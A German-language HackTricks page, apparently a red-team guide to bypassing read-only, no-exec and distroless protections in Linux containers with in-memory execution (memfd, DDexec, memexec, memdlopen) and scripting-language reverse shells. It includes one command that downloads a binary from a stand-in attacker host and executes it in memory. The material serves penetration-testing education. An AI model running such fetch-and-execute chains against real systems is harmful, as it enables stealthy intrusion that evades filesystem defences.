# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn du an einer **Hacking-Karriere** interessiert bist und das Unhackbare hacken möchtest - **wir stellen ein!** (_fließend Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

In den folgenden Videos findest du die auf dieser Seite erwähnten Techniken ausführlicher erklärt:

* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## read-only / no-exec Szenario

Es ist immer häufiger anzutreffen, dass Linux-Maschinen mit **schreibgeschütztem (ro) Dateisystemschutz** gemountet werden, insbesondere in Containern. Das liegt daran, dass es so einfach ist, einen Container mit ro Dateisystem zu betreiben, wie **`readOnlyRootFilesystem: true`** im `securitycontext` festzulegen:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Allerdings, selbst wenn das Dateisystem als ro gemountet ist, bleibt **`/dev/shm`** beschreibbar, sodass es falsch ist zu sagen, dass wir nichts auf die Festplatte schreiben können. Diese Ordner werden jedoch **mit no-exec-Schutz** gemountet, sodass du eine hier heruntergeladene Binärdatei **nicht ausführen kannst**.

{% hint style="warning" %}
Aus der Perspektive eines Red Teams macht dies das **Herunterladen und Ausführen** von Binärdateien, die sich nicht bereits im System befinden (wie Backdoors oder Enumerator wie `kubectl`), **kompliziert**.
{% endhint %}

## Einfachster Bypass: Skripte

Beachte, dass ich von Binärdateien gesprochen habe, du kannst **jedes Skript ausführen**, solange der Interpreter auf der Maschine vorhanden ist, wie ein **Shell-Skript**, wenn `sh` vorhanden ist, oder ein **Python-Skript**, wenn `python` installiert ist.

Allerdings reicht das nicht aus, um deine Binär-Backdoor oder andere Binärwerkzeuge auszuführen, die du möglicherweise benötigst.

## Speicher-Bypasses

Wenn du eine Binärdatei ausführen möchtest, aber das Dateisystem dies nicht zulässt, ist der beste Weg, dies zu tun, indem du sie **aus dem Speicher ausführst**, da die **Schutzmaßnahmen dort nicht gelten**.

### FD + exec syscall Bypass

Wenn du einige leistungsstarke Skript-Engines auf der Maschine hast, wie **Python**, **Perl** oder **Ruby**, könntest du die Binärdatei herunterladen, um sie aus dem Speicher auszuführen, sie in einem Speicher-Dateideskriptor (`create_memfd` syscall) speichern, der nicht durch diese Schutzmaßnahmen geschützt ist, und dann einen **`exec` syscall** aufrufen, der den **fd als die auszuführende Datei angibt**.

Dafür kannst du leicht das Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) verwenden. Du kannst ihm eine Binärdatei übergeben, und es wird ein Skript in der angegebenen Sprache generiert, das die **Binärdatei komprimiert und b64 kodiert** mit den Anweisungen, um sie in einem **fd** zu **dekodieren und zu dekomprimieren**, das durch den Aufruf des `create_memfd` syscalls erstellt wird, und einen Aufruf des **exec** syscalls, um sie auszuführen.

{% hint style="warning" %}
Dies funktioniert nicht in anderen Skriptsprachen wie PHP oder Node, da sie keine **Standardmethode haben, um rohe Syscalls** aus einem Skript aufzurufen, sodass es nicht möglich ist, `create_memfd` aufzurufen, um den **Speicher fd** zu erstellen, um die Binärdatei zu speichern.

Darüber hinaus wird das Erstellen eines **regulären fd** mit einer Datei in `/dev/shm` nicht funktionieren, da du sie nicht ausführen darfst, weil der **no-exec-Schutz** gilt.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ist eine Technik, die es dir ermöglicht, den **Speicher deines eigenen Prozesses** zu **modifizieren**, indem du dessen **`/proc/self/mem`** überschreibst.

Daher kannst du, indem du **den Assembly-Code kontrollierst**, der vom Prozess ausgeführt wird, einen **Shellcode** schreiben und den Prozess "mutieren", um **beliebigen Code auszuführen**.

{% hint style="success" %}
**DDexec / EverythingExec** ermöglicht es dir, deinen eigenen **Shellcode** oder **jede Binärdatei** aus dem **Speicher** zu laden und **auszuführen**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Für weitere Informationen zu dieser Technik, siehe das Github oder:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ist der natürliche nächste Schritt von DDexec. Es ist ein **DDexec Shellcode, der demonisiert wurde**, sodass Sie jedes Mal, wenn Sie **eine andere Binärdatei ausführen** möchten, DDexec nicht neu starten müssen. Sie können einfach den Memexec-Shellcode über die DDexec-Technik ausführen und dann **mit diesem Daemon kommunizieren, um neue Binärdateien zu laden und auszuführen**.

Ein Beispiel, wie man **memexec verwendet, um Binärdateien von einer PHP-Reverse-Shell auszuführen**, finden Sie unter [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Mit einem ähnlichen Zweck wie DDexec ermöglicht die Technik [**memdlopen**](https://github.com/arget13/memdlopen) eine **einfachere Möglichkeit, Binärdateien** im Speicher zu laden, um sie später auszuführen. Es könnte sogar ermöglichen, Binärdateien mit Abhängigkeiten zu laden.

## Distroless Bypass

### Was ist distroless

Distroless-Container enthalten nur die **minimalen Komponenten, die notwendig sind, um eine bestimmte Anwendung oder einen Dienst auszuführen**, wie Bibliotheken und Laufzeitabhängigkeiten, schließen jedoch größere Komponenten wie einen Paketmanager, eine Shell oder Systemdienstprogramme aus.

Das Ziel von Distroless-Containern ist es, die **Angriffsfläche von Containern zu reduzieren, indem unnötige Komponenten eliminiert** und die Anzahl der ausnutzbaren Schwachstellen minimiert wird.

### Reverse Shell

In einem Distroless-Container finden Sie möglicherweise **nicht einmal `sh` oder `bash`**, um eine reguläre Shell zu erhalten. Sie werden auch keine Binärdateien wie `ls`, `whoami`, `id`... finden, alles, was Sie normalerweise in einem System ausführen.

{% hint style="warning" %}
Daher werden Sie **nicht** in der Lage sein, eine **Reverse Shell** zu erhalten oder das System wie gewohnt zu **enumerieren**.
{% endhint %}

Wenn der kompromittierte Container jedoch beispielsweise eine Flask-Webanwendung ausführt, ist Python installiert, und daher können Sie eine **Python-Reverse-Shell** erhalten. Wenn es Node ausführt, können Sie eine Node-Reverse-Shell erhalten, und dasselbe gilt für die meisten **Skriptsprache**.

{% hint style="success" %}
Mit der Skriptsprache könnten Sie das **System enumerieren**, indem Sie die Sprachfähigkeiten nutzen.
{% endhint %}

Wenn es **keine `read-only/no-exec`**-Schutzmaßnahmen gibt, könnten Sie Ihre Reverse Shell missbrauchen, um **Ihre Binärdateien im Dateisystem zu schreiben** und sie **auszuführen**.

{% hint style="success" %}
In dieser Art von Containern werden diese Schutzmaßnahmen jedoch normalerweise vorhanden sein, aber Sie könnten die **vorherigen Techniken zur Ausführung im Speicher verwenden, um sie zu umgehen**.
{% endhint %}

Sie finden **Beispiele**, wie man **einige RCE-Schwachstellen ausnutzt**, um Skriptsprache **Reverse Shells** zu erhalten und Binärdateien aus dem Speicher auszuführen unter [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn Sie an einer **Hacking-Karriere** interessiert sind und das Unhackbare hacken möchten - **wir stellen ein!** (_fließend Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
